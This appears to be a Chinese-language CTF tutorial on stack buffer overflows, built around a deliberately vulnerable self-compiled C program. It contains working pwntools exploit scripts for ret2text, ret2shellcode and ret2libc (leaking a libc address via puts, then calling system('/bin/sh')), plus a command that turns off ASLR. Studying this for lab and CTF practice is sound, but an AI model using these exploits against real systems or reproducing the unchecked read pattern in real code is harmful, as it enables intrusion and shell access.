---
title: 02 栈溢出：从覆盖返回地址到第一个 shell
date: 2026-11-15T22:15:41+08:00
lastmod: 2026-11-15T22:15:41+08:00
---

# 02 栈溢出：从覆盖返回地址到第一个 shell

# 02 栈溢出：从覆盖返回地址到第一个 shell

栈溢出是 pwn 的起点：往栈上的缓冲区写超过它长度的数据，把 saved rbp 和返回地址一起覆盖，函数 ​`ret`​ 的时候 ​`rip` 就变成了你写进去的值。这篇从一个自己编译的靶子开始，把偏移、ret2text、栈对齐、ret2shellcode、ret2libc 走一遍。

## 0x00 原理

```c
void backdoor(void) {
    system("/bin/sh");
}

int main(void) {
    char buf[32];
    read(0, buf, 0x100);   // 读 256 字节进 32 字节的缓冲区
    return 0;
}
```

`read` 不检查长度，栈布局是：

```text
+---------------------+  高地址
| 返回地址             |  <- rbp + 8   ← 覆盖它，ret 时跳走
+---------------------+
| saved rbp           |  <- rbp
+---------------------+
| buf[32]             |  <- rbp - 0x20
+---------------------+  低地址
```

写 ​`0x20 + 8 = 40`​ 字节刚好填满 buf 和 saved rbp，第 41 字节开始就是返回地址。用 ​`p64(backdoor)`​ 把后门地址写进去，​`main`​ 一 ​`ret`​ 就执行 ​`system("/bin/sh")`。

## 0x01 靶子

```c
// vuln.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void win(void) {
    system("/bin/sh");
}

int main(void) {
    char buf[32];
    puts("input:");
    read(0, buf, 0x100);
    puts("bye");
    return 0;
}
```

```bash
gcc -O0 -fno-stack-protector -no-pie -z execstack -o vuln vuln.c
checksec --file=./vuln
```

编译出来 ​`main` 的序言是：

```asm
push rbp
mov  rbp, rsp
sub  rsp, 0x40        ; 0x20 给 buf，0x20 是影子空间/对齐
...
lea  rax, [rbp-0x20]  ; buf 的地址
mov  rdx, rax
mov  ecx, 0
call read
```

`buf`​ 在 ​`rbp-0x20`​，所以偏移到返回地址 = ​`0x20 + 8 = 40`。

## 0x02 算偏移的三种方法

### 方法一：cyclic 定位（最稳）

```python
from pwn import *
context.log_level = 'error'

p = process('./vuln')
p.sendline(cyclic(100))
p.wait()

core = p.corefile
print(hex(core.rip))            # 0x616161... 之类的 pattern
print(cyclic_find(core.rip & 0xffffffff))   # 得到偏移
```

64 位下 ​`rip`​ 可能只覆盖了前 6 字节，用 ​`cyclic_find(core.rip)`​ 常常找不到，取低 4 字节或直接看 ​`core.read(core.rsp-8, 8)` 附近。

### 方法二：gdb 手看

```bash
python3 -c "from pwn import *; print(cyclic(100).decode())" > /tmp/in
gdb ./vuln -ex 'run < /tmp/in' -ex 'x/i $rip' -ex 'info registers rbp rsp'
```

`rip`​ 变成 pattern 的某一段，​`cyclic -l 0x6161616a` 就能算出偏移。

### 方法三：数汇编

`buf`​ 到 ​`rbp`​ 的距离 + 8。​`char buf[32]`​ 在 ​`rbp-0x20`​，就是 ​`0x20 + 8 = 40`。局部变量多的时候这个方法最快，但要确认编译器没把 buf 放到别的位置。

## 0x03 第一个 exploit：ret2text

题目里有现成的 ​`win` 函数（后门），直接跳到它：

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

elf = ELF('./vuln')
win = elf.symbols['win']          # 也可以 elf.sym.win
print('win =', hex(win))

p = process('./vuln')
p.recvuntil(b'input:')
p.sendline(flat(b'A' * 40, win))
p.interactive()
```

`flat`​ 会自动把整数按架构转成小端字节，等价于 ​`b'A'*40 + p64(win)`。

如果程序在远程：

```python
p = remote('127.0.0.1', 9999)
```

## 0x04 64 位栈对齐：最常见的"地址对但没 shell"

`system`​ 内部有 ​`movaps`​ 指令，要求 ​`rsp`​ 16 字节对齐。直接 ​`ret`​ 到 ​`win`​ / ​`system` 时，栈可能差 8 字节，表现是段错误而不是 shell。

解决办法是垫一个只有 ​`ret` 的 gadget：

```python
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
payload = flat(b'A' * 40, ret, win)
```

判断标准：进 ​`system`​ 时 ​`rsp % 16 == 0`​。不确定就加一个 ​`ret`，崩了就换一个位置再试。

## 0x05 ret2shellcode

栈可执行（​`-z execstack`，或题目给了 RWX 段）时，可以直接把 shellcode 写到栈上再跳过去：

```python
from pwn import *

context(arch='amd64', os='linux')
shellcode = asm(shellcraft.sh())

p = process('./vuln')
p.recvuntil(b'input:')

# 32 位：buf 的地址可以直接算；64 位通常要先泄露栈地址
buf_addr = 0xffffd000          # 示例地址，实际要泄露或调试得出
payload = flat(shellcode.ljust(40, b'A'), buf_addr)
p.sendline(payload)
p.interactive()
```

要点：

- shellcode 通常只有 20 多字节，塞进 32 字节缓冲区没问题。
- 地址必须知道：关掉 ASLR 时栈地址固定；开着 ASLR 就要先泄露（格式化字符串、​`read` 返回值等）。
- `ret2shellcode`​ 和 ​`ret2text` 的区别只是跳的目标不同，偏移算法一样。

## 0x06 保护机制速览

```bash
checksec --file=./vuln
```

|保护|含义|被挡住时怎么办|
| ----------| ------------------------------------| ---------------------------------------|
|NX / DEP|栈、堆不可执行|不能 ret2shellcode，改 ROP / ret2libc|
|Canary|返回地址前有随机值，函数返回时校验|先泄露 canary，或找不校验的路径|
|PIE|代码段地址随机化|先泄露代码基址，再算偏移|
|ASLR|系统级地址随机化|泄露 libc / 栈地址|
|RELRO|部分/完全只读 GOT|Full RELRO 下不能改 GOT，走 ret2libc|
|FORTIFY|编译期检查部分函数|换别的溢出点|

`checksec` 输出逐项对照：

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

`NX enabled`​ + ​`No PIE` 是最常见的入门配置：不能执行栈，但代码地址固定，适合 ret2text / ROP / ret2libc。

## 0x07 ret2libc：没有后门时

没有 ​`win`​，但程序调过 ​`puts`​ / ​`read`​，就可以泄露 libc 地址，再算 ​`system`：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./vuln')
libc = ELF('./libc.so.6')          # 题目给的 libc，没有就用本机

p = process('./vuln')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 第一次：泄露 puts 的真实地址，再回到 main 重新来一遍
payload = flat(
    b'A' * 40,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main'],
)
p.recvuntil(b'input:')
p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f'leak={hex(leak)} base={hex(libc_base)} system={hex(system)}')

# 第二次：system("/bin/sh")
payload = flat(b'A' * 40, ret, pop_rdi, binsh, system)
p.recvuntil(b'input:')
p.sendline(payload)
p.interactive()
```

关键点：

- `pop rdi; ret`​ 用来把参数放进 ​`rdi`，这是 x64 传参的规定。
- 泄露后要回到 ​`main`（或某个能再次触发溢出的函数），否则进程已经结束了。
- libc 版本必须对：题目一般给 ​`libc.so.6`​，用 ​`patchelf`​ 换，或用 ​`libc-database` 查偏移。
- 第二次 payload 前的 ​`ret` 是栈对齐用的，崩了就加/减一个。

## 0x08 pwntools 模板

```python
#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux', log_level='info')

BIN = './vuln'
HOST, PORT = '127.0.0.1', 9999
LOCAL = True

elf = ELF(BIN)
libc = ELF('./libc.so.6') if os.path.exists('./libc.so.6') else None

def start():
    if LOCAL:
        return process(BIN)
    return remote(HOST, PORT)

p = start()

# 交互
# p.recvuntil(b'input:')
# p.sendline(payload)
# p.interactive()
```

常用收发：

```python
p.recvuntil(b'input:')     # 收到指定字符串
p.recvline()               # 收一行（含 \n）
p.recv(8)                  # 收固定长度
p.sendline(b'abc')         # 发一行（自动加 \n）
p.sendafter(b':', b'abc')  # 收到后发，不加换行
p.interactive()            # 交还终端，之后手动敲命令
```

## 0x09 调试

```python
gdb.attach(p, gdbscript='''
b *0x4011a0
c
''')
```

- 断在 ​`read`​ 返回后 / ​`ret`​ 前，看 ​`x/20gx $rsp`，确认返回地址被覆盖成什么。
- core dump：​`ulimit -c unlimited`​，​`p.corefile` 直接读崩溃现场。
- `cyclic`​ 配合 ​`cyclic_find` 是算偏移最快的组合。

## 0x0a 常见坑

- **字节序**：​`p64`​ 是小端，手写 ​`b'\x32\x11\x40\x00'` 容易错位。
-  **​`\x00`​**​ **截断**：​`strcpy`​ / ​`strlen`​ / ​`printf("%s")`​ 遇到 ​`\x00`​ 就停，地址里带零字节时要换 ​`send`​ 而不是 ​`sendline`，或者先泄露。
-  **​`\x0a`​**​ **截断**：​`gets`​ / ​`scanf`​ 遇到换行就停，payload 里出现 ​`\x0a`​ 时改用 ​`p.send` 并在前面垫数据。
- **输入函数不同**：​`gets`​ 读一行、​`read`​ 按长度、​`scanf("%s")` 遇空白停，偏移算法一样但发送方式不同。
- **栈对齐**：64 位调 ​`system`​ 崩在 ​`movaps`​，加一个 ​`ret`。
- **ASLR 没关**：本地调试时 ​`setarch -R ./vuln`​ 或 ​`echo 0 > /proc/sys/kernel/randomize_va_space`（需要权限）。
- **远程和本地 libc 不同**：本地通了远程不通，先确认 libc 版本，别怀疑 payload。
- **PIE 开着还写死地址**：​`elf.symbols['win']` 在 PIE 下是偏移，不是运行时地址，需要泄露基址。

## 0x0b 复盘模板

```text
题目：
架构：amd64 / i386
保护：NX / Canary / PIE / RELRO
溢出函数：read / gets / strcpy / scanf
缓冲区位置：rbp-0x20
偏移：40
目标：ret2text / ret2shellcode / ret2libc / ROP
关键地址：win=0x... / pop rdi=0x... / system=0x...
payload：
踩坑：
FLAG / shell：
```
